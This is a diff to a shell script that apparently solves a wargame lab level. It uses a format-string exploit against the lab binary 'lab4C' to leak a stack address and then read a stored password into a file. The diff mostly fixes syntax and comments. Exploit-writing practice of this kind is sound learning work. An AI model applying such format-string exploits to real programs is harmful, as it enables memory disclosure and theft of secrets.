@@ -12,12 +12,12 @@
 # since the address [esp+0x12] is placed as the first argument of printf ([esp+0x4]) we can just
 # print it with help of the %x format
 
-esp12=$((python -c 'print "%08x\n"' | /levels/lab04/lab4C) | tail -n 1 | cut -d" " -f1)
+esp12=$(python -c 'print "%08x\n"' | /levels/lab04/lab4C | tail -n 1 | cut -d" " -f1)
 
 # Then add it 100 bytes (0x76-0x12) to match the password string address
 pass=$(python -c 'import sys; print int(sys.argv[1], 16)+100' $esp12)
 
-# Lets write a simple script to make the format exploit more simple
+# Lets write a script to make the format exploit more simple
 
 cat > /tmp/.formatit.py <<EOF
 
@@ -29,7 +29,7 @@ import sys
 offset  = int(sys.argv[1], 0)
 address = int(sys.argv[2], 0)
 
-# in case that the offset of the buffer is not alligned we have to insert some padding
+# In case that the offset of the buffer is not alligned we have to insert some padding
 pad = "X"*(offset%4)
 
 print "%%%d\$s"%((offset+3) / 4)
@@ -46,8 +46,9 @@ EOF
 # Now we can use our script to build our format string exploit and read the password
 passfile=/tmp/lab4C.pass
 
-echo "$(python /tmp/.formatit.py "0x12" $pass | /levels/lab04/lab4C | tail -n1 | cut -d" " -f1) > $passfile
+echo $(python /tmp/.formatit.py "0x12" $pass | /levels/lab04/lab4C | tail -n1 | cut -d" " -f1) > $passfile
 echo Password stored in $passfile
 
 # Clean-up
+echo Cleaning up dotfiles...
 rm -f /tmp/.formatit.py
